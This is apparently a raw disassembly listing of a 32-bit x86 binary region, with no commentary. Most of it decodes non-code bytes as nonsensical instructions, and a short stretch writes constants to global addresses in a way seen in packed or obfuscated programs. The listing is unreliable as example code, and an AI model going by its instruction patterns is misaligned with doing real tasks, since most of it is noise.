  40d5e4:	mov    dh,BYTE PTR [eax]
  40d5e6:	cmp    al,0x87
  40d5e8:	imul   dx,WORD PTR [edi+0x75bb7821],0xffd4
  40d5f0:	(bad)  
  40d5f1:	adc    BYTE PTR [edi+0xa5fa5bf],cl
  40d5f7:	and    eax,0x26b45c12
  40d5fc:	jg     0x40d622
  40d5fe:	in     al,dx
  40d5ff:	mov    ebp,ebp
  40d601:	sub    DWORD PTR [ebp+0x34],esp
  40d604:	xor    ecx,DWORD PTR [esp+eax*1-0x5053d56a]
  40d60b:	inc    esp
  40d60c:	ret    
  40d60d:	ins    BYTE PTR es:[edi],dx
  40d60e:	ret    0x1103
  40d611:	pop    eax
  40d612:	jmp    0x40d609
  40d614:	dec    esi
  40d615:	inc    eax
  40d616:	nop
  40d617:	bound  ebx,QWORD PTR [ebp-0x5d]
  40d61a:	push   0xae332b73
  40d61f:	sub    bh,BYTE PTR [ebp-0x33]
  40d622:	int    0xd9
  40d624:	fs xor ecx,eax
  40d627:	xor    eax,0xc5e33c08
  40d62c:	inc    esi
  40d62d:	sahf   
  40d62e:	pusha  
  40d62f:	xor    DWORD PTR [edi-0x45],ebp
  40d632:	aaa    
  40d633:	ss mov ebx,0x8b6de92d
  40d639:	jae    0x40d62c
  40d63b:	pop    ecx
  40d63c:	pop    edi
  40d63d:	fmul   QWORD PTR ds:0x673ead26
  40d643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d644:	jl     0x40d6b5
  40d646:	adc    ah,BYTE PTR [ecx+0x17]
  40d649:	pop    es
  40d64a:	dec    esp
  40d64b:	shl    BYTE PTR [esi+0xa],cl
  40d64e:	xchg   esi,eax
  40d64f:	mov    fs,WORD PTR [edi+eiz*8+0x6]
  40d653:	xor    BYTE PTR [eax-0x15],0x2d
  40d657:	out    dx,eax
  40d658:	repz shr BYTE PTR [ebx-0x1e],1
  40d65c:	or     al,0x75
  40d65e:	ltr    WORD PTR [ebx+0x45ac503f]
  40d665:	nop
  40d666:	cmp    esi,esi
  40d668:	sbb    cl,BYTE PTR [ecx]
  40d66a:	pop    esi
  40d66b:	adc    BYTE PTR [ebx+ecx*1+0x20d4aa4e],bh
  40d672:	hlt    
  40d673:	lds    esp,FWORD PTR [edi-0x7d]
  40d676:	push   cs
  40d677:	inc    BYTE PTR [edi]
  40d679:	mov    dh,ah
  40d67b:	je     0x40d620
  40d67d:	adc    BYTE PTR [ecx-0xa9487c],0x62
  40d684:	in     al,dx
  40d685:	pop    esi
  40d686:	daa    
  40d687:	fld    QWORD PTR [edi+ebx*4]
  40d68a:	idiv   DWORD PTR [ecx]
  40d68c:	(bad)  
  40d68d:	or     al,0x8e
  40d68f:	xor    al,0x41
  40d691:	outs   dx,DWORD PTR ds:[esi]
  40d692:	mov    ds:0xe78cd9a3,eax
  40d697:	out    0xfe,al
  40d699:	mov    bh,0x8c
  40d69b:	ret    0x3423
  40d69e:	xchg   ebx,eax
  40d69f:	xchg   edx,eax
  40d6a0:	jmp    0xd7c7edb7
  40d6a5:	cmp    DWORD PTR [esi],esi
  40d6a7:	sub    BYTE PTR [esi+0x4796e596],dh
  40d6ad:	ds push eax
  40d6af:	cmp    bh,BYTE PTR [edi+esi*8]
  40d6b2:	arpl   WORD PTR [ecx+0x64ea7b4b],dx
  40d6b8:	lock add al,0x3c
  40d6bb:	push   ecx
  40d6bc:	sub    al,0xa9
  40d6be:	pop    ds
  40d6bf:	scas   al,BYTE PTR es:[edi]
  40d6c0:	inc    ebx
  40d6c1:	or     eax,ebp
  40d6c3:	cmp    cl,BYTE PTR [eax]
  40d6c5:	mov    esp,0x406d20b8
  40d6ca:	fidivr DWORD PTR [esi+0x7f]
  40d6cd:	adc    al,0x66
  40d6cf:	xchg   esp,eax
  40d6d0:	or     DWORD PTR [ebx-0x80],ecx
  40d6d3:	or     ebx,edx
  40d6d5:	mov    ebp,0xaa27830c
  40d6da:	and    eax,0xd0a1d254
  40d6df:	test   al,0x6a
  40d6e1:	aaa    
  40d6e2:	push   esi
  40d6e3:	dec    edx
  40d6e4:	xchg   ebx,eax
  40d6e5:	ja     0x40d746
  40d6e7:	jmp    0xcddf31c9
  40d6ec:	xchg   BYTE PTR [ecx+esi*8-0xa],ch
  40d6f0:	add    BYTE PTR fs:[ecx+eiz*4-0x620a5ede],dl
  40d6f8:	ss or  al,0x5f
  40d6fb:	inc    esi
  40d6fc:	jno    0x40d6f8
  40d6fe:	sub    esp,edx
  40d700:	fimul  DWORD PTR [ebp-0x2b8d7b06]
  40d706:	cli    
  40d707:	xchg   BYTE PTR [edi-0x1a],cl
  40d70a:	fwait
  40d70b:	inc    esp
  40d70c:	dec    esp
  40d70d:	cmp    BYTE PTR [esp+esi*2-0x20],ah
  40d711:	outs   dx,DWORD PTR ds:[esi]
  40d712:	pop    ss
  40d713:	adc    DWORD PTR [esi+0x78224d3b],ebp
  40d719:	push   eax
  40d71a:	shr    cl,1
  40d71c:	ds jb  0x40d6db
  40d71f:	in     eax,0xb3
  40d721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d722:	dec    DWORD PTR [ecx+0x77]
  40d725:	cmp    al,0xba
  40d727:	and    al,ch
  40d729:	dec    ecx
  40d72a:	es ret 
  40d72c:	mov    dl,dl
  40d72e:	dec    esi
  40d72f:	jno    0x40d765
  40d731:	fs push es
  40d733:	and    esp,DWORD PTR [esi+0x224db326]
  40d739:	out    0x66,al
  40d73b:	gs daa 
  40d73d:	jns    0x40d71e
  40d73f:	ins    BYTE PTR es:[edi],dx
  40d740:	jecxz  0x40d7ae
  40d742:	ja     0x40d6e2
  40d744:	retf   
  40d745:	ds jne 0x40d6d9
  40d748:	mov    bp,WORD PTR [ebx-0x5eaa89e6]
  40d74f:	and    ah,BYTE PTR [ebx]
  40d751:	jle    0x40d778
  40d753:	mov    eax,ds:0x23da319b
  40d758:	xchg   ebx,eax
  40d759:	out    0x3f,eax
  40d75b:	mov    al,0xa7
  40d75d:	jp     0x40d732
  40d75f:	std    
  40d760:	mov    al,0xe3
  40d762:	es jmp 0xed68:0x1bc463e6
  40d76a:	adc    BYTE PTR [esi+0x5b],ah
  40d76d:	mov    edi,0x33e78266
  40d772:	push   ss
  40d773:	jmp    0x3c28d62b
  40d778:	push   ebx
  40d779:	xchg   esi,eax
  40d77a:	xchg   ecx,eax
  40d77b:	adc    DWORD PTR [edx+0x378db964],edx
  40d781:	mov    WORD PTR [eax+0x3011a16d],ss
  40d787:	jae    0x40d719
  40d789:	xchg   ebx,eax
  40d78a:	push   ecx
  40d78b:	or     dh,BYTE PTR [esi-0x6d]
  40d78e:	fadd   DWORD PTR [ecx+0x72968733]
  40d794:	repnz fist WORD PTR [edi-0x661990b6]
  40d79b:	rcr    BYTE PTR [ebp+0x2d],1
  40d79e:	(bad)  
  40d79f:	das    
  40d7a0:	int3   
  40d7a1:	adc    ecx,eax
  40d7a3:	out    0x33,eax
  40d7a5:	jbe    0x40d7aa
  40d7a7:	stos   BYTE PTR es:[edi],al
  40d7a8:	fisub  WORD PTR [ebx-0x631bc286]
  40d7ae:	xor    BYTE PTR [edi],bl
  40d7b0:	(bad)  
  40d7b1:	adc    esp,DWORD PTR [edi+0x5]
  40d7b4:	outs   dx,BYTE PTR ds:[esi]
  40d7b5:	inc    ebp
  40d7b6:	in     al,dx
  40d7b7:	sbb    al,BYTE PTR [ebx]
  40d7b9:	xor    DWORD PTR [esi+0x3cff8114],0xc7000003
  40d7c3:	add    eax,0x42a7bd
  40d7c8:	mov    ebp,0xf000014
  40d7cd:	test   DWORD PTR [edi],edi
  40d7cf:	add    eax,0x5230000
  40d7d4:	lds    esp,FWORD PTR [edi+0x53e90042]
  40d7da:	add    al,BYTE PTR [eax]
  40d7dc:	add    ch,cl
  40d7de:	retf   0xced6
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x26551ba3]
  40d7eb:	(bad)  
  40d7ec:	leave  
  40d7ed:	pop    ecx
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	xchg   ebx,eax
  40d7f6:	push   edi
  40d7f7:	sar    DWORD PTR [esi+eax*4+0x5e389cc9],0xf1
  40d7ff:	inc    ebp
  40d800:	mov    al,ds:0x53a60357
  40d805:	push   ebp
  40d806:	adc    eax,0xb31a840b
  40d80b:	pop    es
  40d80c:	mov    eax,0x4c8488f5
  40d811:	jae    0x40d7aa
  40d813:	rol    BYTE PTR [ebp+0x70],1
  40d816:	and    esi,ebp
  40d818:	lods   al,BYTE PTR ds:[esi]
  40d819:	mov    esp,0x897c9c64
  40d81e:	or     bl,bh
  40d820:	fsubr  st,st(3)
  40d822:	add    edi,DWORD PTR [ecx]
  40d824:	pop    esi
  40d825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d826:	add    DWORD PTR [eax+ebx*1+0x60],eax
  40d82a:	dec    esp
  40d82b:	ds cwde 
  40d82d:	mov    edx,0x226fb41c
  40d832:	adc    DWORD PTR [ebx+eiz*8],esp
  40d835:	jmp    0x40d849
  40d837:	in     eax,0xb0
  40d839:	loopne 0x40d8b1
  40d83b:	lahf   
  40d83c:	dec    esp
  40d83d:	mov    ebx,DWORD PTR [ebp+edx*2-0x26]
  40d841:	xor    esi,DWORD PTR [esp+edx*2]
  40d844:	call   0xc1a63a17
  40d849:	inc    esi
  40d84a:	in     al,0x8c
  40d84c:	xor    dh,BYTE PTR [eax-0x3515d259]
  40d852:	dec    ecx
  40d853:	test   eax,0xbe8878cd
  40d858:	mov    esi,0x87d72de2
  40d85d:	jl     0x40d81f
  40d85f:	jmp    0x40d80d
  40d861:	in     al,0x90
  40d863:	sub    BYTE PTR [ecx],bl
  40d865:	mov    ds:0xfcf70c53,al
  40d86a:	cmp    esp,DWORD PTR ds:0x15f6f571
  40d870:	scas   eax,DWORD PTR es:[edi]
  40d871:	sete   al
  40d874:	mov    BYTE PTR fs:[ebp-0x1a],dl
  40d878:	pop    esp
  40d879:	ror    BYTE PTR [ebx+0x659a095b],1
  40d87f:	pop    esi
  40d880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d881:	dec    eax
  40d882:	leave  
  40d883:	scas   eax,DWORD PTR es:[edi]
  40d884:	sti    
  40d885:	push   edi
  40d886:	pop    ss
  40d887:	(bad)  
  40d888:	test   DWORD PTR [ebx+0x13330738],ebp
  40d88e:	pop    es
  40d88f:	ds mov bl,ah
  40d892:	jp     0x40d860
  40d894:	imul   ebx,DWORD PTR [edx-0x7a34c6a],0x36
  40d89b:	push   edx
  40d89c:	sbb    BYTE PTR [eax+0x7d7cfe2b],ch
  40d8a2:	gs inc esp
  40d8a4:	add    al,0xcc
  40d8a6:	das    
  40d8a7:	outs   dx,BYTE PTR ds:[esi]
  40d8a8:	jmp    0xf1eb:0x1e42879a
  40d8af:	mov    bl,0xe3
  40d8b1:	jp     0x40d8b0
  40d8b3:	ins    DWORD PTR es:[edi],dx
  40d8b4:	dec    eax
  40d8b5:	jno    0x40d914
  40d8b7:	push   ebx
  40d8b8:	pop    ss
  40d8b9:	pop    ecx
  40d8ba:	jg     0x40d8f2
  40d8bc:	sub    esp,ecx
  40d8be:	mov    ds:0x2d871642,eax
  40d8c3:	dec    ebp
  40d8c4:	xchg   esp,eax
  40d8c5:	pop    ebx
  40d8c6:	std    
  40d8c7:	adc    BYTE PTR [edx+0x1eedec85],ah
  40d8cd:	sbb    eax,0xfadac538
  40d8d2:	enter  0xc67,0x91
  40d8d6:	mov    eax,ds:0x4d2fbede
  40d8db:	pop    ecx
  40d8dc:	jbe    0x40d8b8
  40d8de:	cdq    
  40d8df:	adc    al,0xe3
  40d8e1:	cld    
  40d8e2:	sub    BYTE PTR [edx],bl
  40d8e4:	jl     0x40d8ca
  40d8e6:	inc    esp
  40d8e7:	ins    BYTE PTR es:[edi],dx
  40d8e8:	pop    ecx
  40d8e9:	fldenv [ecx]
  40d8eb:	fld    QWORD PTR [eax+esi*4]
  40d8ee:	cmp    bh,BYTE PTR [esi-0x4]
  40d8f1:	pop    edi
  40d8f2:	xchg   DWORD PTR [edi-0x64],ebx
  40d8f5:	dec    esi
  40d8f6:	dec    ecx
  40d8f7:	pop    ss
  40d8f8:	and    bl,BYTE PTR [ebp-0x44d89d19]
  40d8fe:	imul   ecx,edx,0x91ac2c62
  40d904:	dec    ebx
  40d905:	mov    ebx,?
  40d907:	sub    bl,BYTE PTR [edi-0x5fad6dfe]
  40d90d:	add    al,0x30
  40d90f:	cli    
  40d910:	push   eax
  40d911:	xor    DWORD PTR ds:0xc156a856,ecx
  40d917:	xor    ebp,DWORD PTR [ebx]
  40d919:	jp     0x40d93f
  40d91b:	fisub  WORD PTR [ebp-0x18f49e35]
  40d921:	out    dx,eax
  40d922:	push   ds
  40d923:	cwde   
  40d924:	jbe    0x40d99e
  40d926:	xchg   edi,eax
  40d927:	hlt    
  40d928:	cwde   
  40d929:	daa    
  40d92a:	lahf   
  40d92b:	(bad)  
  40d92c:	and    eax,0x78e5f64
  40d931:	mov    cl,0xd8
  40d933:	jb     0x40d94b
  40d935:	out    0x8d,eax
  40d937:	enter  0x72db,0x18
  40d93b:	add    al,BYTE PTR [ebp-0x3202e3c6]
  40d941:	pop    edx
  40d942:	(bad)  
  40d943:	in     eax,dx
  40d944:	repnz add al,0xf7
  40d947:	push   ebp
  40d948:	add    dl,BYTE PTR [ebp+0x57]
  40d94b:	sub    eax,0x381165c3
  40d950:	cdq    
  40d951:	mov    eax,ds:0x75be6262
  40d956:	mov    edx,0xd74e5c48
  40d95b:	fisub  WORD PTR [esi+0x2d9fafee]
  40d961:	dec    eax
  40d962:	retf   0xecb4
  40d965:	push   ecx
  40d966:	xchg   edi,eax
  40d967:	sub    bh,BYTE PTR [edi-0x6db1bed2]
  40d96d:	push   es
  40d96e:	in     al,0x27
  40d970:	jne    0x40d93e
  40d972:	lea    esi,ds:0x64c6a896
  40d978:	fwait
  40d979:	test   DWORD PTR [ebx+0x7b15a81c],esp
  40d97f:	add    ch,dl
  40d981:	retf   0xb52d
  40d984:	dec    edx
  40d985:	cmp    BYTE PTR [esi],dl
  40d987:	cwde   
  40d988:	cdq    
  40d989:	sar    BYTE PTR [ecx+0x38b5acd0],1
  40d98f:	test   cl,bh
  40d991:	enter  0x71a4,0x76
  40d995:	daa    
  40d996:	shl    DWORD PTR [edi-0x1c],cl
  40d999:	or     eax,0x48bcbb66
  40d99e:	pushf  
  40d99f:	dec    edx
  40d9a0:	mov    dh,0x41
  40d9a2:	sbb    eax,0x7e8cddab
  40d9a7:	(bad)  
  40d9a8:	mov    edi,0xc2180c9c
  40d9ad:	jb     0x40d9e1
  40d9af:	sub    ebp,DWORD PTR [edi+edx*4+0x4]
  40d9b3:	sub    al,0x71
  40d9b5:	xor    DWORD PTR ds:0x53d246b1,0xfffffff8
  40d9bc:	fdiv   QWORD PTR [esi]
  40d9be:	out    dx,al
  40d9bf:	vpaddsb zmm5{k7},zmm6,DWORD PTR [ebx+eiz*1+0x2eb49395]{1to16}
  40d9ca:	push   cs
  40d9cb:	push   es
  40d9cc:	pop    ss
  40d9cd:	sbb    edx,ebx
  40d9cf:	cdq    
  40d9d0:	pop    edi
  40d9d1:	mov    edx,0xf00a5141
  40d9d6:	mov    ah,0xa2
  40d9d8:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40d9da:	int3   
  40d9db:	xor    BYTE PTR [ebp-0x5b],ah
  40d9de:	and    al,0x1e
  40d9e0:	vpmacssww ymm1,ymm3,ymm4,YMMWORD PTR [eax]
  40d9e6:	rol    BYTE PTR [esi+0x3c],0x45
  40d9ea:	mov    WORD PTR [ebp+0x44],ss
  40d9ed:	sbb    BYTE PTR ds:[edx],al
  40d9f0:	mov    ebx,0x82fb4da4
  40d9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f6:	(bad)
  40d9fa:	pop    eax
  40d9fb:	mov    WORD PTR [esi+0x2b40d1fa],?
  40da01:	or     bl,dl
  40da03:	sub    ebx,DWORD PTR [ebx-0x17250b73]
  40da09:	shl    DWORD PTR [ecx],cl
  40da0b:	xor    eax,0x5241adfb
  40da10:	mul    DWORD PTR [ebx]
  40da12:	call   0x8ebc:0x8609e624
  40da19:	fld    TBYTE PTR [edx+0x3c]
  40da1c:	shl    BYTE PTR [edi],1
  40da1e:	loope  0x40d9b4
  40da20:	adc    al,0x36
  40da22:	outs   dx,BYTE PTR ds:[esi]
  40da23:	ins    BYTE PTR es:[edi],dx
  40da24:	(bad)  [edi]
  40da26:	cmp    BYTE PTR [ecx-0x55],ah
  40da29:	shr    DWORD PTR [esi+0x4481bed2],cl
  40da2f:	lds    eax,FWORD PTR [ebx-0x5efff79b]
  40da35:	xor    DWORD PTR [eax+0x51b0042],ebp
  40da3b:	or     DWORD PTR [eax+0x31a30042],ebp
  40da41:	test   al,0x42
  40da43:	add    BYTE PTR [ebx+0x3581f845],cl
  40da49:	icebp  
  40da4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da4b:	inc    edx
  40da4c:	add    BYTE PTR [ebp+0x2b0042a7],bh
  40da52:	inc    ebp
  40da53:	or     BYTE PTR [ecx+0x42a8010d],al
  40da59:	add    BYTE PTR [eax],bh
  40da5b:	or     al,0x0
  40da5d:	add    BYTE PTR [eax-0x7f],dl
  40da60:	adc    eax,0x42a771
  40da65:	inc    edi
  40da66:	popa   
  40da67:	add    BYTE PTR [eax],al
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	aas    
  40da7e:	sub    eax,DWORD PTR [edi*8+0x7878ae16]
  40da85:	xor    eax,0xa678787e
  40da8a:	xchg   edi,eax
  40da8b:	push   edi
  40da8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da8d:	mul    BYTE PTR [edx-0x719925f1]
  40da93:	cmp    al,BYTE PTR [ebp-0xb]
  40da96:	dec    esp
  40da97:	in     eax,dx
  40da98:	(bad)  
  40da9a:	add    al,0x6b
  40da9c:	pop    ebx
  40da9d:	dec    ebp
  40da9e:	jno    0x40db0e
  40daa0:	sbb    dl,BYTE PTR [esi-0x6]
  40daa3:	and    DWORD PTR [edx],0x3f39d600
  40daa9:	push   edi
  40daaa:	and    ebx,DWORD PTR [edi]
  40daac:	fs out 0x9a,al
  40daaf:	pushw  cs
  40dab1:	mov    dh,0xe1
  40dab3:	and    DWORD PTR [ebx+0x3d],ebx
  40dab6:	mov    ebp,0xb70b3343
  40dabb:	mov    eax,ds:0xdc9d9b37
  40dac0:	shl    DWORD PTR [eax-0x4f],cl
  40dac3:	sub    eax,0xe51c1aeb
  40dac8:	adc    al,0x44
  40daca:	bound  edi,QWORD PTR [esi]
  40dacc:	xor    al,0x8b
  40dace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacf:	ret    
  40dad0:	cmp    esi,DWORD PTR [eax-0xabfbc8b]
  40dad6:	jge    0x40dabc
  40dad8:	arpl   WORD PTR [ebx+0x2f],si
  40dadb:	pop    esp
  40dadc:	pop    esi
  40dadd:	aaa    
  40dade:	sub    ah,BYTE PTR [edx+0x0]
  40dae1:	ficomp DWORD PTR [edx]
  40dae3:	ins    BYTE PTR es:[edi],dx
  40dae4:	fstp   DWORD PTR ds:0x3c0ca812
  40daea:	mov    dh,0x54
  40daec:	push   ecx
  40daed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daee:	push   ecx
  40daef:	into   
  40daf0:	nop
  40daf1:	or     al,0x4f
  40daf3:	fs xor al,0x1a
  40daf6:	loopne 0x40dabc
  40daf8:	sahf   
  40daf9:	mov    dl,0x61
  40dafb:	inc    ebp
  40dafc:	mov    eax,ds:0x3902afef
  40db01:	lock jle 0x40dae9
  40db04:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40db06:	ds xchg edx,eax
  40db08:	lahf   
  40db09:	popa   
  40db0a:	inc    esi
  40db0b:	lock xchg ebp,eax
  40db0d:	fisub  DWORD PTR [ebp-0x24b03341]
  40db13:	jbe    0x40db15
  40db15:	adc    eax,0xd7a0dfaf
  40db1a:	mov    esp,0xe6e1edcd
  40db1f:	pop    es
  40db20:	lahf   
  40db21:	inc    edi
  40db22:	mov    eax,ds:0x99ffb1ae
  40db27:	dec    esp
  40db28:	xchg   ebp,eax
  40db29:	inc    edx
  40db2a:	xchg   ecx,eax
  40db2b:	push   edi
  40db2c:	or     esi,DWORD PTR [esi]
  40db2e:	pushf  
  40db2f:	mov    ebx,0x7de84e98
  40db34:	(bad)  
  40db36:	adc    al,BYTE PTR [ebx+edi*1-0x49]
  40db3a:	pop    esp
  40db3b:	sar    BYTE PTR [edx+0x715b773e],cl
  40db41:	fisttp QWORD PTR [ecx-0x79]
  40db44:	mov    ds:0x98b14050,eax
  40db49:	pusha  
  40db4a:	mov    ah,0x2b
  40db4c:	(bad)  
  40db4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db4e:	pop    ebx
  40db4f:	popf   
  40db50:	push   ds
  40db51:	loopne 0x40db68
  40db53:	out    0xa3,al
  40db55:	inc    ebx
  40db56:	xchg   edx,eax
  40db57:	test   BYTE PTR [esi],dl
  40db59:	dec    ebp
  40db5a:	cmc    
  40db5b:	add    DWORD PTR [ebx],edx
  40db5d:	sub    DWORD PTR [edi-0x436a0e3e],esi
  40db63:	fidivr WORD PTR [ebp+0x27]
  40db66:	daa    
  40db67:	pop    eax
  40db68:	test   al,0xd1
  40db6a:	les    eax,FWORD PTR [ebp+0x7e527956]
  40db70:	jo     0x40db2d
  40db72:	xchg   esp,eax
  40db73:	popf   
  40db74:	mov    dh,0x3e
  40db76:	loopne 0x40db17
  40db78:	shl    DWORD PTR [ecx],cl
  40db7a:	or     dl,BYTE PTR [esi-0x703f7ab4]
  40db80:	retf   
  40db81:	cmp    ch,ch
  40db83:	aaa    
  40db84:	xor    al,0x72
  40db86:	xor    eax,ebx
  40db88:	inc    esp
  40db89:	and    al,0xa5
  40db8b:	jnp    0x40dbde
  40db8d:	and    cl,cl
  40db8f:	cmp    eax,0xe4fd6cee
  40db94:	outs   dx,DWORD PTR ds:[esi]
  40db95:	xchg   BYTE PTR [ecx],al
  40db97:	mov    ah,0x14
  40db99:	inc    ecx
  40db9a:	mov    BYTE PTR [eax],ch
  40db9c:	push   ecx
  40db9d:	and    eax,0x4bc1308b
  40dba2:	adc    BYTE PTR [edx+edx*4-0x19],dh
  40dba6:	sahf   
  40dba7:	sbb    al,dl
  40dba9:	xor    eax,0x907843b2
  40dbae:	daa    
  40dbaf:	mov    esi,0x3b00dfaf
  40dbb4:	in     eax,0x5f
  40dbb6:	repz add al,0x70
  40dbb9:	mov    dl,0x52
  40dbbb:	adc    esi,edi
  40dbbd:	and    eax,0x1719f07d
  40dbc2:	or     BYTE PTR [edi-0x69],bh
  40dbc5:	pop    es
  40dbc6:	mov    ah,0x82
  40dbc8:	es xor al,0x91
  40dbcb:	adc    BYTE PTR [eax+edx*4],ah
  40dbce:	pop    esi
  40dbcf:	jbe    0x40dbb2
  40dbd1:	pop    ecx
  40dbd2:	xor    al,BYTE PTR [edi-0x7929a100]
  40dbd8:	mov    DWORD PTR [esi+0xccf6180],ebp
  40dbde:	arpl   WORD PTR [esi-0x76],dx
  40dbe1:	pop    ss
  40dbe2:	cmp    DWORD PTR [edx+0x6],eax
  40dbe5:	call   0x878d0ff5
  40dbea:	(bad)  
  40dbeb:	pop    ebx
  40dbec:	push   esi
  40dbed:	ja     0x40dbeb
  40dbef:	repz jne 0x40dbd7
  40dbf2:	shr    BYTE PTR [eax],cl
  40dbf4:	jnp    0x40dbc4
  40dbf6:	mov    ebx,0xab6cbb06
  40dbfb:	out    0x6e,al
  40dbfd:	test   eax,0x55d4b51d
  40dc02:	hlt    
  40dc03:	pop    esp
  40dc04:	jl     0x40dbfe
  40dc06:	loopne 0x40dbb2
  40dc08:	jl     0x40dc1c
  40dc0a:	loope  0x40dc61
  40dc0c:	call   0x671090aa
  40dc11:	fmul   st(2),st
  40dc13:	rcr    BYTE PTR [eax-0x7d829fb1],cl
  40dc19:	sti    
  40dc1a:	scas   eax,DWORD PTR es:[edi]
  40dc1b:	es jle 0x40dc07
  40dc1e:	fwait
  40dc1f:	cld    
  40dc20:	cwde   
  40dc21:	xor    al,0xc1
  40dc23:	pop    ecx
  40dc24:	(bad)  
  40dc25:	adc    ebx,DWORD PTR [ecx]
  40dc27:	adc    edi,DWORD PTR [esi+0x12]
  40dc2a:	leave  
  40dc2b:	inc    eax
  40dc2c:	dec    edx
  40dc2d:	jne    0x40dbc2
  40dc2f:	jp     0x40dc65
  40dc31:	push   0xa3df5742
  40dc36:	sbb    BYTE PTR [ebx-0x73a7b070],dh
  40dc3c:	xor    edi,DWORD PTR [ecx+0x74]
  40dc3f:	fadd   DWORD PTR [edi]
  40dc41:	xchg   ecx,eax
  40dc42:	popf   
  40dc43:	in     al,0x2
  40dc45:	and    BYTE PTR es:[ecx-0x29],ch
  40dc49:	lods   eax,DWORD PTR ds:[esi]
  40dc4a:	xlat   BYTE PTR ds:[ebx]
  40dc4b:	inc    esi
  40dc4c:	push   ss
  40dc4d:	adc    al,0xaa
  40dc4f:	and    eax,eax
  40dc51:	repz add DWORD PTR [ecx-0x6],0x3
  40dc56:	mov    DWORD PTR [edx-0x59],edi
  40dc59:	frstor [ebx+0x27684804]
  40dc5f:	icebp  
  40dc60:	push   ecx
  40dc61:	xor    al,0xaa
  40dc63:	leave  
  40dc64:	or     eax,0x4f0d5735
  40dc69:	pop    edx
  40dc6a:	(bad)  
  40dc6b:	in     eax,dx
  40dc6c:	and    al,0x47
  40dc6e:	lds    ebx,FWORD PTR [esi-0x70863e6e]
  40dc74:	xor    ecx,DWORD PTR [edx-0x65]
  40dc77:	mov    dh,0xad
  40dc79:	cld    
  40dc7a:	push   0xecba2ce3
  40dc7f:	sbb    DWORD PTR [ebx+0x7c468407],edx
  40dc85:	mov    esi,0x62a41296
  40dc8a:	outs   dx,DWORD PTR ds:[esi]
  40dc8b:	aad    0x10
  40dc8d:	mov    ds,WORD PTR [ebp+0x2e]
  40dc90:	inc    esp
  40dc91:	or     eax,0xd6c72ce9
  40dc96:	xchg   ebx,eax
  40dc97:	add    BYTE PTR [esi+0x51eb4b73],dl
  40dc9d:	and    al,0xb8
  40dc9f:	cmp    al,0xb4
  40dca1:	mov    bh,0xe1
  40dca3:	mov    esp,0x5b448ea9
  40dca8:	inc    edx
  40dca9:	mov    BYTE PTR [ebx+ecx*1+0x746561f],cl
  40dcb0:	popa   
  40dcb1:	(bad)  
  40dcb2:	repz lock pop esi
  40dcb5:	daa    
  40dcb6:	add    DWORD PTR [ebp+edx*4-0x10],ebx
  40dcba:	test   eax,esp
  40dcbc:	jno    0x40dcfc
  40dcbe:	in     al,0x63
  40dcc0:	sub    edx,DWORD PTR [esp+ebx*4+0x84503b9]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	mov    ebx,0xd3b26169
  40dd68:	lods   al,BYTE PTR ds:[esi]
  40dd69:	js     0x40dde3
  40dd6b:	xor    eax,0x5578787e
  40dd70:	mov    cl,0xae
  40dd72:	mov    ah,0xe4
  40dd74:	jbe    0x40ddad
  40dd76:	std    
  40dd77:	xchg   edx,eax
  40dd78:	aaa    
  40dd79:	out    0xa0,eax
  40dd7b:	(bad)  [esi-0x31bb83c9]
  40dd81:	mov    ebp,0x3f61874d
  40dd86:	push   edi
  40dd87:	in     al,dx
  40dd88:	cmp    BYTE PTR [ecx+ebx*4-0x7d],bl
  40dd8c:	not    BYTE PTR [ecx+0x53]
  40dd8f:	or     BYTE PTR [edx-0x187e58fa],ch
  40dd95:	jmp    0xe186bc80
  40dd9a:	idiv   ch
  40dd9c:	mov    DWORD PTR [edi-0x3c500ee6],ebx
  40dda2:	fwait
  40dda3:	mov    al,ds:0xd3cf1506
  40dda8:	jo     0x40de28
